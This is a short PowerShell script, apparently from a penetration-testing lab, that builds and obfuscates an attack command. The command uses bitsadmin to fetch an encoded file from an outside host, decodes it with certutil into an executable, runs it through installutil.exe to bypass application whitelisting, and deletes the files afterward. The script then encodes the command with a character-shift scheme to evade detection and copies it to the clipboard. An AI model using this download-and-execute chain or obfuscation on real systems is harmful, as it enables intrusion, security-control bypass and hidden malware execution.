$payload = "cmd /c bitsadmin /Transfer myJob http://192.168.49.84/enc.txt c:\Users\student\enc.txt && certutil -decode c:\Users\student\enc.txt c:\Users\student\InstallUtilBypass.exe && del c:\Users\student\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Users\student\InstallUtilBypass.exe && del c:\Users\student\InstallUtilBypass.exe"

[string]$output = ""

$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 17
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
    }
}
$output | clip
